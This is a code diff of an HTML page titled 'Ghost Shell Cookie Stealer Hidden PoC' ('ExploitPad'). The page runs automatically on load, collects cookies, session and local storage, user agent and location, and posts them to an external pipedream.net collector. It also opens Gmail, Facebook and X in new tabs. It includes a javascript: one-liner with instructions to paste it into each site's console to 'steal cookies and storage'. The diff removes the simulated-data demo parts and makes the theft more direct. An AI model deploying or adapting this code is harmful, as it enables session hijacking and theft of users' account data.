@@ -83,27 +83,17 @@
     <style>
         body { background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; font-family: Arial, sans-serif; }
         h2 { text-align: center; color: gold; text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); }
-        input { margin: 10px; padding: 5px; }
     </style>
 </head>
 <body>
     <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
-    <input type="text" id="fakeInput" placeholder="Enter something..." oninput="storeFakeData()">
-    <script>
-        function storeFakeData() {
-            const value = document.getElementById('fakeInput').value;
-            localStorage.setItem('fakeUserInput', value);
-            sessionStorage.setItem('tempData', value);
-            document.cookie = 'fakeCookie=' + value + ';path=/';
-        }
-    </script>
 </body>
 </html></textarea>
         <button onclick="runCode()">▶ Run Demo Code</button>
-        <textarea id="stealScript" readonly>javascript:(function(){var c=document.cookie||'No_Cookies_Found';var ss={};for(var i=0;i<sessionStorage.length;i++){ss[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i));}var ls={};for(var i=0;i<localStorage.length;i++){ls[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));}var h=history.length>0?history.length:'No_History_Data';if(Object.keys(ss).length===0)ss='No_Session_Data';if(Object.keys(ls).length===0)ls='No_Local_Data';fetch('https://eoy4evvlsf7y0jq.m.pipedream.net',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie_data:c,session_storage:ss,local_storage:ls,history_length:h,user_agent:navigator.userAgent||'Unknown_User_Agent',referrer:document.referrer||'No_Referrer',source:location.hostname,location:window.location.href,timestamp:new Date().toISOString()})}).then(r=>console.log('Data sent:',r)).catch(e=>console.error('Error:',e));})();</textarea>
+        <textarea id="stealScript" readonly>javascript:(function(){var c=document.cookie||'No_Cookies_Found';var ss={};for(var i=0;i<sessionStorage.length;i++){ss[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i));}var ls={};for(var i=0;i<localStorage.length;i++){ls[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));}if(Object.keys(ss).length===0)ss='No_Session_Data';if(Object.keys(ls).length===0)ls='No_Local_Data';fetch('https://eoy4evvlsf7y0jq.m.pipedream.net',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie_data:c,session_storage:ss,local_storage:ls,user_agent:navigator.userAgent||'Unknown_User_Agent',referrer:document.referrer||'No_Referrer',source:location.hostname,location:window.location.href})}).then(r=>console.log('Data sent:',r)).catch(e=>console.error('Error:',e));})();</textarea>
         <iframe id="output"></iframe>
         <div class="instructions">
-            <p>This PoC opens Gmail, FB, and X in new tabs on load and simulates capturing data from this page and iframe. Enter text in the iframe to see it stored and stolen.</p>
+            <p>Gmail, FB, and X opened in new tabs. Copy the script above, paste it into each tab's console (F12), and press Enter to steal cookies and storage.</p>
         </div>
     </div>
 
@@ -118,71 +108,62 @@
             outputFrame.close();
         }
 
-        // Enhanced data-stealing function
+        // Generalized data-stealing function
         function stealAndSendData(win, context) {
-            try {
-                const cookies = win.document.cookie || "No_Cookies_Found";
-                const sessionData = Object.keys(win.sessionStorage).length > 0 
-                    ? Object.fromEntries(Object.keys(win.sessionStorage).map(key => [key, win.sessionStorage.getItem(key)])) 
-                    : "No_Session_Data";
-                const localData = Object.keys(win.localStorage).length > 0 
-                    ? Object.fromEntries(Object.keys(win.localStorage).map(key => [key, win.localStorage.getItem(key)])) 
-                    : "No_Local_Data";
-                const historyLength = win.history.length > 0 ? win.history.length : "No_History_Data";
-
-                const payload = {
-                    cookie_data: cookies,
-                    session_storage: sessionData,
-                    local_storage: localData,
-                    history_length: historyLength,
-                    user_agent: win.navigator.userAgent || "Unknown_User_Agent",
-                    referrer: win.document.referrer || "No_Referrer",
-                    source: win.location.hostname,
-                    location: win.location.href,
-                    context: context,
-                    timestamp: new Date().toISOString()
-                };
-
-                console.log(`[${context}] Collected Data:`, payload);
-
-                fetch("https://eoy4evvlsf7y0jq.m.pipedream.net", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                })
-                .then(response => {
-                    console.log(`[${context}] Data sent: ${response.status} ${response.statusText}`);
-                })
-                .catch(error => {
-                    console.error(`[${context}] Error sending data:`, error);
-                });
-            } catch (error) {
-                console.error(`[${context}] Error in stealAndSendData:`, error);
+            var cookies = win.document.cookie || "No_Cookies_Found";
+            var sessionData = {};
+            for (var i = 0; i < win.sessionStorage.length; i++) {
+                var key = win.sessionStorage.key(i);
+                sessionData[key] = win.sessionStorage.getItem(key);
             }
+            if (Object.keys(sessionData).length === 0) sessionData = "No_Session_Data";
+
+            var localData = {};
+            for (var i = 0; i < win.localStorage.length; i++) {
+                var key = win.localStorage.key(i);
+                localData[key] = win.localStorage.getItem(key);
+            }
+            if (Object.keys(localData).length === 0) localData = "No_Local_Data";
+
+            var payload = {
+                cookie_data: cookies,
+                session_storage: sessionData,
+                local_storage: localData,
+                user_agent: win.navigator.userAgent || "Unknown_User_Agent",
+                referrer: win.document.referrer || "No_Referrer",
+                source: win.location.hostname,
+                location: win.location.href,
+                context: context
+            };
+
+            console.log("Collected Data from " + context + ":", payload);
+
+            fetch("https://eoy4evvlsf7y0jq.m.pipedream.net", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                console.log("Data sent successfully from " + context + ":", response);
+            })
+            .catch(error => {
+                console.error("Error sending data from " + context + ":", error);
+            });
         }
 
         // Auto-run on page load
         document.addEventListener("DOMContentLoaded", function() {
             console.log("ExploitPad loaded - opening sites and stealing local data...");
 
-            // Steal data from this page (current domain)
+            // Steal data from this page (GitHub Pages domain)
             stealAndSendData(window, "ExploitPad Page");
 
             // Auto-open Gmail, Facebook, and X.com in new tabs
-            const gmailTab = window.open("https://mail.google.com", "_blank");
-            const fbTab = window.open("https://facebook.com", "_blank");
-            const xTab = window.open("https://x.com", "_blank");
-
-            // Simulate storing some fake visited data
-            localStorage.setItem("visitedSite", "ExploitPad");
-            sessionStorage.setItem("sessionID", "12345");
-            document.cookie = "user=test;path=/";
-
-            // Steal from iframe after it loads
-            setTimeout(() => {
-                let iframeWin = document.getElementById("output").contentWindow;
-                stealAndSendData(iframeWin, "Iframe Context");
-            }, 1500); // Increased delay to ensure iframe content loads
+            window.open("https://mail.google.com", "_blank");
+            window.open("https://facebook.com", "_blank");
+            window.open("https://x.com", "_blank");
 
             // Run demo code in iframe
             runCode();
